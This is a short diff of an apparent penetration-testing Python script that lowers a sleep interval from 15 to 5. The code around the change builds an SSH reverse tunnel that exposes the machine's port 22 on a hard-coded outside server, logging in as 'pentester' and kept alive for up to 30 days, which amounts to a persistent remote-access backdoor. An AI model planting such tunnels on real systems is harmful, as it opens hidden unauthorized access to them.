@@ -13,7 +13,7 @@ import os
 
 RPORT = 5522
 SERVER="45.76.173.191"
-SLEEP = 15
+SLEEP = 5
 USER = "pentester"
 DAYS = 30
 COMMAND = ["ssh", "-C", "-N", "-R", str(RPORT) + ":localhost:" + "22", "-o", "ServerAliveInterval=60", "-o", "ServerAliveCountMax=" + str(DAYS*24*60), USER + "@" + SERVER]
